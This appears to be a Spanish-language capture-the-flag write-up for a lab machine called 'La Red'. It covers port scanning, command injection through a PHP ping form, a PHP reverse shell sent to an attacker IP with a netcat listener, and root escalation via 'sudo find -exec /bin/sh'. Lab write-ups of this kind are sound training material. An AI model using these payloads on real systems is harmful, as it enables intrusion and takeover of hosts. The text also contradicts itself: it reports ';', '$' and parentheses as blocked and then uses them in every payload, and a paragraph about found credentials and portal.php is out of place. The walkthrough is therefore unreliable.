# >_ [La Red]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | Whoami Labs |
| **Dificultad** | 🟡 Media  |
| **OS** | Linux  |
| **IP de la Máquina** | `172.17.0.2` |
| **Fecha de resolución** | 2026-10-22 |

---

## 📝 Descripción
Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios mediante abuso de permisos SUDO.

---

## 🔍 1. Fase de Reconocimiento y Enumeración

Comenzamos realizando un ping a la máquina y vemos que es un Linux
<img width="696" height="129" alt="ping" src="https://github.com/user-attachments/assets/6904cdd3-0a60-4eeb-a7a0-7fee2957ca3b" />
<br><br>

### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
 sudo nmap -p- --open -n -Pn 172.17.0.2 -oN allPorts
```

**Resultados del escaneo:**
* **Puerto 80/TCP**: HTTP

<img src="./img/1escaneo.png" width="70%">
<br>

### Enumeración de servicios
Continuamos con un escaneo más profundo del servicio encontrado:

```bash
nmap -p80 -sCV -n 172.17.0.2 -oN targeted
```

<img src="./img/2Escaneopuerto.png" width="70%">
<br><br>
Tenemos una página web creada con PHP 8.2.32, es una versión bastante reciente.

### Enumeración Web (Puerto 80)

Al inspeccionar el sitio web, nos encontramos con una página web llamada La Red, contiene una herramienta de diagnóstico en la que nos pide una dirección IP para hacer ping.


<img src="./img/3web.png" width="90%">
<br><br>

Probamos a hacernos ping a nosotros mismos y funciona.
<img src="./img/4ping.png" width="70%">
<br>

Ahora vamos a probar a poner otro comando seguido para ver si nos lo ejecuta pero nos da error, nos dice que los caracteres no estan permitidos, así que no acepta el ;
<img src="./img/4probando.png" width="70%">
<br><br>

Vamos probando con otros caracteres hasta que descubrimos que el || si nos lo acepta y podemos ver el resultado de un ls.
<img width="1426" height="919" alt="5solodejaasi" src="https://github.com/user-attachments/assets/2c0ef4f0-d9d8-4541-8d6a-203e9abfc223" />
<br><br>


---

## 💥 2. Fase de Explotación (Acceso Inicial)

Ya que podemos ejecutar comandos, vamos a leer el fichero index.php y vemos que tiene una lista negra con todos los caracteres que no permite: &,;,`,$,(,),{,}
<img width="1355" height="954" alt="6blacklist" src="https://github.com/user-attachments/assets/ce10cc47-bba6-42b4-a06a-ba411b5f169d" />
<br><br>



### Vector de Ataque
Escribimos el usuario y la contraseña encontrados y estamos dentro, vemos que es portal.php, una de las rutas que encontramos previamente pero a la que no podíamos acceder antes.


```bash
127.0.0.1 ; ls -la
```


<br><br>

Nos muestra el ping y debajo nos ha ejecutado el **ls -la** que pusimos, por lo que es vulnerable. 
Hay inyección de comandos, por lo que podemos mirar archivos como el usuario web-admin, ya que haciendo un whoami nos dijo que somos ese usuario.



<br><br>
Entramos al directorio del usuario....

```bash
127.0.0.1 ;  cat /home/web-admin/user.txt
```

<br><br>

La flag es correcta, vamos a continuar obtenido una consola más interactiva para poder escalar privilegios más facilmente.


<br><br>


### Intrusión (Reverse Shell)
Logramos ejecutar comandos en el sistema y establecemos una *reverse shell* hacia nuestra máquina atacante:

```php
# Comando ejecutado en el navegador web
127.0.0.1; php -r '$sock=fsockopen("172.17.0.1",440);exec("/bin/bash <&3 >&3 2>&3");'
```

<br><br>


Ponemos nuestro *netcat* a la escucha para recibir la conexión:
```bash
sudo nc -lvnp 440
```

<br><br>

Ya somos el usuario web-admin desde una terminal, ahora podemos sanitizarla o continuar así, se ve peor pero como anteriormente vimos que con sudo -l podíamos ejecutar find sin contraseña como el usuario root, vamos a escalar privilegios.

```bash
# Tratamiento de  la TTY para tener una consola interactiva cómoda
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```


## 👑 3. Escalada de Privilegios

### Enumeración del Sistema

```bash
# Comprobamos privilegios de SUDO
sudo -l
```
---

### Explotación del Vector de Escalada

Nos aprovechamos del permiso SUID que tenemos para ejecutar find sin contraseña y como el usuario root para convertirnos en él.

```bash
sudo find . -exec /bin/sh \; -quit
```

<br><br>


¡Ya somos **root**! 🚩 Buscamos la flag en la carpeta personal de root.

<br><br>

Por último, validamos la flag obtenida.
